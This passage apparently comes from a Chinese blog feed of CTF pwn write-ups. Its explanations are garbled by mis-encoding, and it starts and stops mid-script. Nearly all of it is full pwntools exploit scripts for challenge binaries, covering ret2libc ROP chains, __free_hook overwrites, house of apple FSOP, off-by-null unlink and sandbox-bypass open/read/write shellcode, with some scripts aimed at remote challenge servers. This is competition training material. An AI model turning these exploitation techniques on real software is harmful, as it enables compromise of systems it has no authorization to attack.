    io.sendlineafter(&quot;Index :&quot;,str(idx))

add(0x500,b'a') 
add(0x500,b'/bin/sh\x00') 
add(0x500,b'a') 
add(0x500,b'a') 
add(0x100,b'a') 
delete(2)
add(0x500,b'a'*8) 
show(5)
io.recvuntil(b'a'*8)
libcbase=u64(io.recv(6).ljust(8,b&quot;\x00&quot;))-0x1ecbe0
print(hex(libcbase))
free_hook= libcbase +libc.sym['__free_hook']
system=libcbase+libc.sym['system']
#gdb.attach(io)
mp=libcbase+0x1EC280+0x50
print(hex(free_hook))
edit(p64(mp))
delete(3)
delete(0)
add(0x500,p64(0)*13+p64(free_hook)) 
#gdb.attach(io)
add(0x500,p64(system))

delete(1)


io.interactive()
</code></pre>
<h2 id="round-1-ezorw">[Round 1] ezorw</h2>
<p>å°±æ˜¯å¼€äº†æ²™ç›’çš„shellcode<br>
<img src="https://l1u66.github.io//post-images/1729872756053.png" alt="" loading="lazy"><br>
éšä¾¿ç»•ä¸€ä¸‹</p>
<pre><code>from pwn import *
from LibcSearcher import *
context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)

p = process(&quot;./pwn&quot;)
elf = ELF(&quot;./pwn&quot;)
libc = elf.libc

payload = asm(shellcraft.openat(0xffffff9c,b&quot;flag&quot;,0))	
#payload = asm(shellcraft.openat(-100,b&quot;flag&quot;,0))	
#-100 AT_FDCWD è¡¨ç¤ºå½“å‰ç›®å½•
payload += asm(shellcraft.pread(3,0x114514000,0x100,0))	
payload += asm(shellcraft.sendfile(1,3,0,0x100))

p.sendafter(&quot;welcome to YLCTF orw~\n&quot;,payload)
p.interactive()
</code></pre>
<h2 id="round-1-ezstack">[Round 1] ezstack</h2>
<p>é€šè¿‡æ ˆæº¢å‡ºå¯ä»¥ä½¿ç¨‹åºè¿è¡Œåˆ°vulnå‡½æ•°ï¼Œå¯¹systemå‡½æ•°çš„å‘½ä»¤ç¦ç”¨äº†s,h,c,få­—ç¬¦ï¼Œç›´æ¥/???/?at *lagèƒ½æ‹¿åˆ°flag</p>
<pre><code>from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = process(&quot;./pwn&quot;)
#gdb.attach(p)
vuln = 0x00000000040127A
p.sendafter(&quot;good stack\n&quot;,b'a'*0x30 + p64(0) + p64(vuln))
p.sendafter(&quot;input your command\n&quot;,b&quot;/???/?at *lag&quot;)
p.interactive()

</code></pre>
<h2 id="round-1-giaopwn"><strong>[Round 1] giaopwn</strong></h2>
<p>ç­¾åˆ°</p>
<pre><code>from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = process(&quot;./pwn&quot;)
#gdb.attach(p)
system = 0x0000000004006D2
cmd = 0x000000000601048
rdi = 0x0000000000400743
ret = rdi + 1
p.sendafter(&quot;welcome to YLCTF\n&quot;,b'a'*32 + p64(0) + p64(rdi) + p64(cmd) + p64(system))

p.interactive()
</code></pre>
<h2 id="round-1-msg_bot"><strong>[Round 1] msg_bot</strong></h2>
<p>æ‰“å¼€ç¨‹åºå‘ç°æ˜¯ä¸€é“protobufçš„pwné¢˜ï¼Œæ‰‹åŠ¨åˆ†æå‡ºprotoæ–‡ä»¶</p>
<pre><code>syntax=&quot;proto3&quot;; //proto version 2 or 3

message msgbot{
    int64 msgid = 1;
    int64 msgsize = 2;
    bytes msgcontent = 3;
}
</code></pre>
<p>åˆ©ç”¨<code>protoc bot.proto --python_out=./</code>å‘½ä»¤ç”Ÿæˆpythonè¯­è¨€çš„ä»£ç ï¼Œå¾—åˆ°ä¸€ä¸ªpythonæ–‡ä»¶ï¼Œå¯ä»¥åœ¨expä¸­å¯¼å…¥ï¼Œæ„å»ºç›¸åº”çš„protobufåŒ…ï¼Œåˆ†æç¨‹åºå‘ç°å¦‚æœè¦æƒ³æ‰§è¡Œåˆ°shellcodeï¼Œéœ€è¦æ»¡è¶³msgid=3235839725ï¼Œmsgsize=4027448014ï¼Œé€šè¿‡è°ƒè¯•å‘ç°è¾“å…¥çš„shellcodeæ¯ä¸ªå­—èŠ‚éœ€è¦åœ¨0x1få’Œ0x7fä¹‹é—´ï¼Œéƒ½éœ€è¦æ˜¯å¯è§å­—ç¬¦ï¼Œè€Œä¸”è¿˜é™åˆ¶äº†shellcodeçš„é•¿åº¦ï¼Œä½†æ˜¯é•¿åº¦æ”¾çš„éå¸¸å¤šï¼Œä¸ç”¨æ€ä¹ˆç®¡ï¼Œç›´æ¥ç”¨alpha3ç”Ÿæˆå³å¯ï¼Œæ„é€ ä¸€ä¸ªshellcodeçš„å†æ¬¡è¯»å…¥ï¼Œåé¢è¯»å…¥çš„shellcodeçš„é™åˆ¶å°±æ²¡æœ‰äº†ï¼Œä½†æ˜¯ç¨‹åºè¿˜å¼€äº†æ²™ç›’<img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1728627907038.png" alt="1728627907038" loading="lazy"></p>
<p>æ²¡åŠæ³•ä½¿ç”¨æ‰“å¼€æ–‡ä»¶çš„æ“ä½œï¼Œä½†æ˜¯å…è®¸äº†ä¸€ä¸ªfstatçš„å‡½æ•°ï¼Œå¯ä»¥çŸ¥é“æ˜¯è¦åˆ©ç”¨retfqæŠŠç¨‹åºè½¬åŒ–ä¸º32ä½ç³»ç»Ÿï¼Œæ­¤æ—¶çš„openå‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨å·å°±æ˜¯5ï¼Œå°±å¯ä»¥æ‰“å¼€æ–‡ä»¶äº†ï¼Œç„¶åå†è½¬åŒ–åˆ°64ä½ç³»ç»Ÿè°ƒç”¨readå’Œwriteå‡½æ•°å³å¯æ‰“å°å‡ºflagï¼Œå…·ä½“è½¬åŒ–çš„ç»†èŠ‚æ…¢æ…¢è°ƒè¯•å°±å¯ä»¥</p>
<pre><code>from pwn import *
import bot_pb2
context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
# p = process(&quot;./msg_bot&quot;)
p = remote(&quot;challenge.yuanloo.com&quot;,29472)
elf = ELF(&quot;./msg_bot&quot;)

# re_read
# from pwn import *

# payload = shellcraft.amd64.read(0, &quot;rdi&quot;, 0x6666)
# f = open('mmap_read', 'wb')
# f.write(asm(payload, arch = 'amd64', os = 'linux'))
# f.close()

data = bot_pb2.msgbot()
data.msgid = 3235839725
data.msgsize = 4027448014
data.msgcontent = b'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M1L3a144z5o108K15380S3E0W0V070N01'
data = data.SerializeToString()
# gdb.attach(p,&quot;b *$rebase(0x0000000000017C9)&quot;)
p.sendafter(&quot;botmsg: &quot;,data)

re_read = asm('''
              push 0x23
              add rcx,5
              push rcx
              retfq
              mov rsp,rcx
''')

# sc = shellcraft.i386.open(&quot;/flag&quot;)
sc = b'h\x01\x01\x01\x01\x814$`f\x01\x01h./fl\xb8\x05\x00\x00\x00\x89\xe31\xc9\xcd\x80'
re_read += sc

re_read1 = asm('''
               push 0x33
               add rsi,0x7a
               push rsi
               retfq
               mov rsp,rbx
''')
re_read += re_read1

rw = shellcraft.amd64.read(0x3, &quot;rbx&quot;, 0x40)
rw += shellcraft.amd64.write(0x1, &quot;rbx&quot;, 0x40)
rw = asm(rw)
re_read += rw
pause()

p.send(b'a'*0x49 + re_read)
p.interactive()
</code></pre>
<h1 id="round-2">Round 2</h1>
<h2 id="round-2-canary">[Round 2] canary</h2>
<p>é€‰é¡¹äºŒå¯ä»¥ç›´æ¥æ”¹rbpå’ŒretæŒ‡ä»¤ï¼Œå¯ä»¥è·³è¿‡canaryï¼ŒæŠŠæ ˆæ§åˆ¶åˆ°bssæ®µä¸Šï¼Œç„¶åç•™ä¸‹ä¸€ä¸ªè¦è·³å…¥çš„åœ°å€åˆ°bssé‡Œï¼Œç•™ä¸‹çš„æ–¹æ³•å°±æ˜¯æŠŠåœ°å€æ”¾åœ¨rbpçš„ä½ç½®ä¸Šï¼Œå¦‚æœæ”¾åˆ°retæŒ‡ä»¤å¤„ï¼Œé‚£ä¹ˆåœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­å°±ä¼šæ”¹å˜ï¼Œç„¶åæŠŠrbpè¿åˆ°stack_chk_failçš„gotè¡¨ä¸Šæ–¹ï¼ŒæŠŠstack_chk_failçš„gotè¡¨æ”¹ä¸ºleave retï¼Œç„¶åå€ŸåŠ©ç•™åœ¨bssçš„åœ°å€è·³åˆ°giftå‡½æ•°ï¼Œåé¢é¢å°±æ˜¯å¸¸è§„çš„ret2libc</p>
<pre><code>from pwn import *
from LibcSearcher import LibcSearcher
context(log_level='debug',arch='amd64',os='linux')

# p = process('./pwn')
p = remote('challenge.yuanloo.com',33016)
# elf = ELF('./pwn')
bss = 0x000000000404060 + 0x900
got1 = 0x000000000404020
got = 0x000000000404028
main = 0x000000000401296
choice_1 = 0x000000000401258
choice_2 = 0x00000000040133F
leave = 0x0000000000401288

p.sendlineafter(&quot;Do you want to enter other functions?\n&quot;, b'2')
payload = p64(bss - 0x10) + p64(main)
p.send(payload)
p.sendlineafter(&quot;Do you want to enter other functions?\n&quot;, b'2')
pay = p64(bss + 0x20) + p64(main)
p.send(pay)
p.sendlineafter(&quot;Do you want to enter other functions?\n&quot;, b'2')
pay = p64(0x000000000401241) + p64(0x00000000040128F)
p.send(pay)
# gdb.attach(p)
p.sendlineafter(&quot;Do you want to enter other functions?\n&quot;, b'2')
pay = p64(got) + p64(choice_2)
p.send(pay)
pay = p64(0x404978) + p64(leave)
p.send(pay)


puts_plt = 0x0000000004010A0
puts_got = 0x000000000404018
main_addr = 0x000000000401258
pop_rdi_ret = 0x00000000004013e3
ret = pop_rdi_ret + 1

#gdb.attach(p)

payload = b'a'*64 + p64(bss) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.send(payload)

puts_addr=u64(p.recv(6).ljust(8,b'\x00'))
print(hex(puts_addr))

libc_base = puts_addr - 0x000000000084420
system_addr = libc_base + 0x000000000052290
bin_addr = libc_base + 0x0000000001B45BD
onegadget = [0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]
one_gadget = libc_base + onegadget[5]#3 4 

print(&quot;base = &quot;,hex(libc_base))
print(&quot;sys = &quot;,hex(system_addr))
print(&quot;bin = &quot;,hex(bin_addr))

#gdb.attach(p)
#pause()
pay = b'b'*64 + p64(bss) + p64(ret) + p64(pop_rdi_ret) + p64(bin_addr) + p64(system_addr)
p.send(pay)

p.interactive()
</code></pre>
<h2 id="round-2-futureheap">[Round 2] futureheap</h2>
<p><img src="https://l1u66.github.io//post-images/1729872807789.png" alt="" loading="lazy"><br>
å…ˆçœ‹initå‡½æ•°ï¼Œå‘ç°æœ‰ä¼ªéšæœºã€å¯æ‰§è¡Œæ®µã€ä¸€å †å¼‚æˆ–å’Œä¸€ä¸ªæ²™ç›’ï¼Œæ²™ç›’æ˜¯ç¦ç”¨äº†execveã€openå’Œwriteï¼Œç›´æ¥openatã€sendfileç»•è¿‡å³å¯ï¼Œæœ‰mmapä¸º7çš„æ®µå¾—çŸ¥æ‰“shellcodeï¼Œè¿™é‡Œæ³¨æ„ç›´æ¥æŠŠéšæœºæ•°ç§å­å¸ƒç½®ä¸ºtime(0)äº§ç”Ÿçš„éšæœºæ•°ä¸å¤ªä¸€æ ·ï¼Œéšæœºæ•°å‰ä¸¤ä½é¢˜ç›®å·²ç»ç»™å‡ºï¼Œçˆ†ç ´éšæœºæ•°ç§å­å³å¯ï¼Œç„¶åå°±å¯ä»¥æ ¹æ®å¼‚æˆ–å¾—åˆ°libcåŸºåœ°å€å’Œmmapç”³è¯·çš„åœ°å€äº†ï¼Œç„¶åçœ‹ä¸»é€»è¾‘<br>
<img src="https://l1u66.github.io//post-images/1729872958655.png" alt="" loading="lazy"></p>
<p>å¦‚æ³¨é‡Šæ‰€ç¤ºï¼Œè¿˜å­˜åœ¨uafæ¼æ´ï¼Œå¤§å°æœ‰é™åˆ¶ï¼Œæ•´ä¸ªç¨‹åºçš„whileéƒ¨åˆ†æ— å›æ˜¾ï¼Œä¹Ÿæ— æ³•æ³„éœ²å †åœ°å€ï¼Œå¯ä»¥åˆ©ç”¨house of appleï¼Œåˆ©ç”¨ä¸€æ¬¡largebin attackåŠ«æŒioç»“æ„ä½“ï¼ŒæŠŠ wide_data åŠ«æŒåˆ°mmapç”³è¯·çš„åœ°å€ï¼Œå› ä¸ºå †åœ°å€ä¸çŸ¥é“ï¼Œmmapçš„åœ°å€çŸ¥é“å¹¶ä¸”å¯å†™ï¼Œç„¶ååœ¨mmapçš„åœ°å€é‡Œå†™å…¥ä¼ªé€ çš„wide_data ï¼Œåé¢å†™ä¸Šshellcodeï¼ŒåŠ«æŒç¨‹åºæ‰§è¡Œå†™å…¥çš„shellcodeå³å¯</p>
<pre><code>from pwn import *
import ctypes

context(os='linux',arch='amd64',log_level='debug')
# io = process('./pwn')
io = remote(&quot;challenge.yuanloo.com&quot;,25509)
e = ELF('./pwn')
libc = e.libc

def dbg():
    gdb.attach(io)


def cmd(choice):
    io.sendline(str(choice).encode())

# å¤§å°åœ¨0x90-0x1000
# 32ä¸ª
def add(idx,size):
    cmd(1)
    sleep(0.5)
    io.sendline(str(idx).encode())
    sleep(0.5)
    io.sendline(str(size).encode())

def edit(idx,payload):
    cmd(2)
    sleep(0.5)
    io.sendline(str(idx).encode())
    sleep(0.5)
    io.sendline(payload)

def delete(idx):
    cmd(3)
    sleep(0.5)
    io.sendline(str(idx).encode())
    
def shellcode(payload):
    cmd(4)
    sleep(0.5)
    io.sendline(b'74r0t#C@rd')
    sleep(0.5)
    # pause()
    io.sendline(payload)

def exit():
    cmd(5)


# gdb.attach(io,&quot;b *$rebase(0x0000000000019FF)&quot;)
lib = ctypes.CDLL('./1.so')

lib.random_number.restype = ctypes.c_int

io.sendlineafter(&quot;Tell me your name, my dear: \n&quot;,b&quot;aaaaaaaa&quot;)

io.recvuntil(&quot;Wolf is &quot;)
wolf = int(io.recvuntil(&quot;.\n&quot;, drop = True))
print(wolf)

io.recvuntil(&quot;Sword is &quot;)
Sword = int(io.recvuntil(&quot;.\n&quot;, drop = True))
print(Sword)

io.recvuntil(&quot;Lion is &quot;)
Lion = int(io.recvuntil(&quot;.\n&quot;, drop = True))
print(Lion)

io.recvuntil(&quot;Snake is &quot;)
Snake = int(io.recvuntil(&quot;.\n&quot;, drop = True))
print(Snake)

seed = lib.set_seed(wolf,Sword)
random1 = lib.random_number(seed)
print(&quot;random1 = &quot;,random1)
random2 = lib.random_number1(seed)
print(&quot;random2 = &quot;,random2)
random3 = lib.random_number2(seed)
print(&quot;random3 = &quot;,random3)
random4 = lib.random_number3(seed)
print(&quot;random4 = &quot;,random4)

setvbuf = wolf ^ random3 ^ Lion
print(&quot;setvbuf = &quot;,hex(setvbuf))
libcbase = setvbuf - 0x0815f0
print(&quot;libcbase = &quot;,hex(libcbase))
fortune = Sword ^ random4 ^ Snake
print(&quot;fortune = &quot;,hex(fortune))

_IO_list_all = libcbase + libc.sym['_IO_list_all']
io_wfile_jumps = libcbase + libc.sym['_IO_wfile_jumps']

add(0, 0x528)
add(1, 0x528)
add(2, 0x518)
delete(0)
add(3, 0x620)
edit(0, p64(0) + p64(0) + p64(0) + p64(_IO_list_all - 0x20))
delete(2)
# gdb.attach(io)
add(4, 0x620)

payload = b'\x00'*0xe0 + p64(fortune + 0x200)
payload += asm(shellcraft.openat(0xffffff9c,b&quot;flag&quot;,0))	
payload += asm(shellcraft.pread(3,fortune + 0x400,0x100,0))	
payload += asm(shellcraft.sendfile(1,3,0,0x100))
payload = payload.ljust(0x200,b'\x00')
payload += b'\x00'*0x68 + p64(fortune + 0xe8)

shellcode(payload)
fake_io_file = p64(0)*2 + p64(1) + p64(2)
fake_io_file = fake_io_file.ljust(
    0xa0 - 0x10, b'\0') + p64(fortune)  # _wide_data (A)
fake_io_file = fake_io_file.ljust(
    0xc0 - 0x10, b'\0') + p64(0xffffffffffffffff)  # _mode
fake_io_file = fake_io_file.ljust(
    0xd8 - 0x10, b'\0') + p64(io_wfile_jumps)  # vtable

cmd(2)
sleep(0.5)
io.sendline(b'2')
sleep(0.5)
io.sendline(fake_io_file)
sleep(0.5)
io.sendline(b'4')
io.interactive()
</code></pre>
<h2 id="round-2-magicread">[Round 2] magicread</h2>
<p>æŸ¥çœ‹ç¨‹åºåªæœ‰ä¸€ä¸ªreadä¸”æº¢å‡ºäº†0x10ä¸ªå­—èŠ‚ï¼Œæ‰“æ ˆè¿ç§»ï¼Œè¿ç§»ä¸¤æ¬¡ï¼Œä¸€æ¬¡æ³„éœ²libcåœ°å€ä¸€æ¬¡å¾—åˆ°shellï¼Œç”±äºéœ€è¦å†æ¬¡readæ‰€ä»¥ç›´æ¥åˆ©ç”¨mainå‡½æ•°</p>
<pre><code>from pwn import *
context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)

# p = process(&quot;./pwn&quot;)
p = remote(&quot;challenge.yuanloo.com&quot;,21148)
#elf = ELF(&quot;./pwn&quot;)

rdi = 0x0000000000400723
rsi_r15 = 0x0000000000400721
rbp = 0x0000000000400578
bss = 0x00000000601040 + 0x500
puts = 0x0000000004004E0
got = 0x000000000601018
leave = 0x0000000000400691

# gdb.attach(p)

payload = b'a'*0x40 + p64(bss + 0x100) + p64(0x000000000400675)
p.sendafter(&quot;just read!\n&quot;,payload)

pay = p64(rdi) + p64(got) + p64(puts) + p64(rbp) + p64(bss+0x300+0x100) + p64(0x000000000400675)
pay = pay.ljust(0x40,b'\x00') + p64(0x601600 - 8) + p64(leave)
p.send(pay)
read_addr = u64(p.recv(6).ljust(8,b'\x00'))
print(hex(read_addr))
libc_base = read_addr - 0x00000000006F6A0
print(hex(libc_base))

#onegadget = [0xe3afe,0xe3b01,0xe3b04]
#one_gadget = libc_base + onegadget[0]

system = libc_base + 0x0000000000453A0
bin_sh = libc_base + 0x00000000018CE57
pay3 =(b'a'*8 + p64(rdi) + p64(bin_sh) + p64(rdi+1) + p64(system)).ljust(0x40,b'\x00')
pay3 += p64(0x601900) + p64(leave)
p.send(pay3)
pause()
p.sendline(b&quot;cat flag&quot;)

p.interactive()
</code></pre>
<h2 id="round-2-ezstack2"><strong>[Round 2] ezstack2</strong></h2>
<p>ret2libc</p>
<pre><code>from pwn import *
context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)

#p = process('./pwn')
p = remote(&quot;challenge.yuanloo.com&quot;,39989)
#elf = ELF('./pwn')

puts_plt = 0x000000000400580
puts_got = 0x000000000601018
main_addr = 0x000000000400739
pop_rdi_ret = 0x0000000000400823
ret = 0x000000000040056e
bss = 0x000000000601060 + 0x700
#gdb.attach(p)

payload = b'a'*0x30 + p64(bss) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendlineafter(&quot;good stack\n&quot;,payload)

puts_addr=u64(p.recv(6).ljust(8,b'\x00'))
print(hex(puts_addr))

libc_base = puts_addr - 0x84420
system_addr = libc_base + 0x52290
bin_addr = libc_base + 0x1b45bd
onegadget = [0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]
one_gadget = libc_base + onegadget[5]#3 4 

print(&quot;base = &quot;,hex(libc_base))
print(&quot;sys = &quot;,hex(system_addr))
print(&quot;bin = &quot;,hex(bin_addr))

# gdb.attach(p)

pause()
pay = b'a'*0x30 + p64(0x404220) + p64(ret) + p64(pop_rdi_ret) + p64(bin_addr) + p64(system_addr)
p.send(pay)

p.interactive()
</code></pre>
<h2 id="round-2-shortshell"><strong>[Round 2] shortshell</strong></h2>
<p>è¯»å…¥äº”ä¸ªå­—èŠ‚çš„shellcodeï¼Œå­˜åœ¨åé—¨å‡½æ•°ï¼Œè®©ç¨‹åºè·³åˆ°åé—¨å‡½æ•°å³å¯ï¼ŒåŸºåœ°å€å¥½åƒä¸ä¸€æ ·ï¼Œè°ƒæ•´ä¸€ä¸‹åç§»å³å¯</p>
<pre><code>from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p = remote(&quot;challenge.yuanloo.com&quot;,43268)
#p = process(&quot;./pwn&quot;)

#gdb.attach(p)
payload = b&quot;\xE9\x02\xd2\xff\xff&quot;
p.sendafter(&quot;Welcome to YLCTF-PWN\n&quot;, payload)

p.interactive()
</code></pre>
<h1 id="round-3">Round 3</h1>
<h2 id="round-3-secret">[Round 3] Secret</h2>
<p>ncåè¾“å…¥â€SuperSecretPassword\nâ€œå³å¾—flag</p>
<h2 id="round-3-ezstack3">[Round 3] ezstack3</h2>
<p>32ä½ï¼Œæ²¡å¼€PIEï¼Œæœ‰systemå‡½æ•°<img src="https://l1u66.github.io//post-images/1729873036427.png" alt="" loading="lazy"></p>
<p>ç¬¬ä¸€æ¬¡readç”¨æ¥æ³„éœ²æ ˆåœ°å€ï¼Œåœ¨æ ˆä¸Šå†™å…¥/bin/shå³å¯çŸ¥é“å…¶åœ°å€ï¼Œç¬¬äºŒæ¬¡readæ„é€ ROPé“¾å°±è¡Œ</p>
<pre><code>from pwn import *
from LibcSearcher import *
context(os=&quot;linux&quot;, arch=&quot;i386&quot;, log_level=&quot;debug&quot;)

flag=1
if flag==1:
	p = process(&quot;./pwn&quot;)
else:
	p = remote(&quot;challenge.yuanloo.com&quot;,30305)

bss = 0x804C02C
pay = b'a'*48
p.sendafter(&quot;Welcome to YLCTF stack3&quot;,pay)
p.recv(48)
stack = u32(p.recv(4))
print(&quot;stack = &quot;,hex(stack))

edi_ebp = 0x080493c2
sys = 0x80490C0
sh = stack - 52
leave = 0x08049185
ret = 0x0804900e

payload =  p32(sys) + p32(bss+0x500) + p32(sh) + b'/bin/sh\x00'
payload = payload.ljust(48)
payload += p32(stack - 68) + p32(leave)
gdb.attach(p)

p.send(payload)

p.interactive()
</code></pre>
<h2 id="round-3-null">[Round 3] null</h2>
<p>2.27ç‰ˆæœ¬çš„off by nullï¼Œæ„é€ unlinkå®ç°å †è¦†ç›–ä¹‹ååŠ«æŒfree_hookä¸ºonegadgetå³å¯</p>
<pre><code>from pwn import *
context(arch='amd64', os='linux', log_level='debug')
# io = process('./pwn')
io = remote(&quot;challenge.yuanloo.com&quot;,29653)
e = ELF('./pwn')
libc = e.libc
one = [0xe6aee, 0xe6af1, 0xe6af4]


def dbg():
    gdb.attach(io)


def cmd(choice):
    io.recvuntil(b':')
    io.sendline(str(choice).encode())

# å¤§å°åœ¨0x90-0x1000
# 32ä¸ª
def add(idx,size):
    cmd(1)
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Size ')
    io.sendline(str(size).encode())


def delete(idx):
    cmd(4)
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())


def show(idx):
    cmd(3)
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())


def edit(idx,content=b'deafbeef'):
    cmd(2)
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Content: ')
    io.sendline(content)

add(0,0xf8)#0
add(1,0xf8)#1
add(2,0xf8)#2
add(3,0xf8)#3
for i in range(20,27):
    add(i,0xf8)
for i in range(20,27):
    delete(i)
pay = b'a'*0xf0 + p64(0x200)
delete(0)
edit(1,pay)
delete(2)
for i in range(20,27):
    add(i,0xf8)
add(31,0xf8)
show(31)
io.recvuntil(b'Content: ')
libc_base = u64(io.recv(6).ljust(8,b'\x00')) - 4112272
print(&quot;libc_base = &quot;,hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook'] 
one = [0x4f29e,0x4f2a5,0x4f302,0x10a2fc]

add(30,0xf8)
delete(3)
delete(30)
edit(1,p64(free_hook))
add(11,0xf8)
add(12,0xf8)
edit(12,p64(libc_base + one[2]))
# gdb.attach(io)
delete(11)

io.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[litctfï¼ˆå›½å¤–ï¼‰]]></title>
        <id>https://l1u66.github.io/post/litctfguo-wai/</id>
        <link href="https://l1u66.github.io/post/litctfguo-wai/">
        </link>
        <updated>2024-09-15T06:14:36.000Z</updated>
        <content type="html"><![CDATA[<p>è¡¥ä¸ªwp<br>
ä¸»è¦æ˜¯ä¸€é“æ²¡æœ‰ä»»ä½•è¾“å‡ºçš„readçš„å¼€äº†æ²™ç›’çš„æ ˆæº¢å‡ºï¼Œåˆ©ç”¨åŸç†ï¼šå…ˆåœ¨bssæ®µè¯»å–éœ€è¦æ‰§è¡Œçš„ropé“¾ï¼Œç„¶åå°†readçš„gotè¡¨æ”¹ä¸€ä¸ªå­—èŠ‚æˆsyscallï¼Œç¨‹åºæ­£å¸¸é€€å‡ºä¼šæœ‰ä¸€ä¸ªeaxç½®é›¶ç„¶åleave outçš„æ“ä½œï¼Œè¯¦ç»†çœ‹exp</p>
<pre><code>from pwn import *
context(arch='amd64', os='linux', log_level='debug')


# p = process('./main')
p = remote(&quot;litctf.org&quot;,31771)
elf = ELF('./main')
libc = elf.libc

bss = 0x000000000404000 + 0x700
pop_rdi = 0x00000000004013d3
pop_rsi_r15 = 0x00000000004013d1
read_got = 0x000000000404030
read_plt = 0x0000000004010A0
rax_0_leave_ret = 0x0000000000401364
payload = b'a'*32 + p64(bss) + p64(pop_rsi_r15) + p64(bss) + p64(0) + p64(read_plt)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0) + p64(read_plt)
payload += p64(pop_rdi) + p64(1) + p64(read_plt)
payload += p64(rax_0_leave_ret) 
p.send(payload)

# gdb.attach(p)

pause()
pay = p64(bss + 0x100) + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(0x404718) + p64(0) + p64(read_plt)
p.send(pay)

pause()
pay = p8(0xf0)
p.send(pay)
libc_base = u64(p.recv(6).ljust(8,b'\x00')) - 0x00000000010E1F0
print(&quot;libc_base = &quot;,hex(libc_base))

pop_rax = 0x0000000000036174 + libc_base
pop_rdx_r12 = 0x0000000000119431 + libc_base
#close
rop = b&quot;./flag.txt&quot;
rop = rop.ljust(0x10,b'\x00')
rop+=p64(pop_rdi)
rop+=p64(0)
rop+=p64(pop_rax)
rop+=p64(3)
rop+=p64(read_plt)

#open
rop+=p64(pop_rdi)
rop+=p64(0x404718)# 'flag' address
rop+=p64(pop_rsi_r15)
rop+=p64(0)
rop+=p64(0)
rop+=p64(pop_rax)
rop+=p64(2)
rop+=p64(read_plt)

#read
rop+=p64(pop_rdi)
rop+=p64(0)
rop+=p64(pop_rsi_r15)
rop+=p64(bss - 0x400)# flag store address
rop+=p64(0)
rop+=p64(pop_rax)
rop+=p64(0)
rop+=p64(read_plt)

#write
rop+=p64(pop_rdi)
rop+=p64(1)
rop+=p64(pop_rsi_r15)
rop+=p64(bss - 0x400)# flag store address
rop+=p64(0)
rop+=p64(pop_rax)
rop+=p64(1)
rop+=p64(read_plt)
pause()
p.send(rop)

p.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ç¬¬å››å±Šâ€œé•¿åŸæ¯â€ç½‘ç»œå®‰å…¨å¤§èµ› æš¨äº¬æ´¥å†€ç½‘ç»œå®‰å…¨æŠ€èƒ½ç«èµ›ï¼ˆåˆèµ›ï¼‰]]></title>
        <id>https://l1u66.github.io/post/di-si-jie-chang-cheng-bei-wang-luo-an-quan-da-sai-ji-jing-jin-ji-wang-luo-an-quan-ji-neng-jing-sai-chu-sai/</id>
        <link href="https://l1u66.github.io/post/di-si-jie-chang-cheng-bei-wang-luo-an-quan-da-sai-ji-jing-jin-ji-wang-luo-an-quan-ji-neng-jing-sai-chu-sai/">
        </link>
        <updated>2024-09-11T08:24:07.000Z</updated>
        <content type="html"><![CDATA[<p>å°±å·®ä¸€åè¿›å†³èµ›ï¼ŒKylin_Heapç­¾åˆ°å †é¢˜æœ¬åœ°é€šäº†ï¼Œè¿œç«¯åç§»æœ‰ç‚¹é—®é¢˜æ²¡æ•´å‡ºæ¥ï¼Œåˆšå‡ºä»¥ä¸ºæ˜¯å‰é¢é‚£é“å†…æ ¸é¢˜æ¼”åŒ–å‡ºæ¥çš„å†…æ ¸å †å°±æ²¡çœ‹ï¼Œåé¢æ²¡æ—¶é—´äº†ï¼Œè¯¶ï¼Œè¿™é“å‡ºæ¥å¿…è¿›å†³èµ›å•Šï¼Œæˆ‘æ˜¯é˜Ÿä¼ç½ªäººğŸ˜­ğŸ˜­ğŸ˜­</p>
<h1 id="flowershop">FlowerShop</h1>
<p>æœ‰ä¸ªæ ˆæº¢å‡ºæ£€æµ‹å¯ä»¥ç›´æ¥ç»•è¿‡ï¼Œç„¶åä¿®æ”¹é’±æ•°ä¹°magicæä¾›/bin/shå­—ç¬¦ä¸²ï¼Œshopå‡½æ•°ä¸­æœ‰ä¸ªcheckå‡½æ•°ï¼Œå¦‚æœä¹°äº†ä¸¤ä¸ªaï¼Œä¸€ä¸ªbè¿˜æœ‰ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œé¢˜ç›®ç»™äº†systemå‡½æ•°ï¼Œå¯ä»¥ç›´æ¥æ‹¿åˆ°shell</p>
<pre><code>from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = remote(&quot;8.147.131.74&quot;,27260)
# p = process(&quot;./pwn1&quot;)
rdi = 0x0000000000400f13
ret = 0x00000000004006f6

pay = b'a'*52 + b'pwn' + b'\x00' + p64(0x1234)
p.sendlineafter(&quot;è¯·è¾“å…¥ä½ çš„å§“å:\n&quot;,pay)
p.sendlineafter(&quot;è¯·è¾“å…¥ä½ çš„é€‰é¡¹:\n&quot;,b'a')
p.sendlineafter(&quot;è¯·è¾“å…¥è´­ä¹°çš„å•†å“åºå·:\n&quot;,b'a')
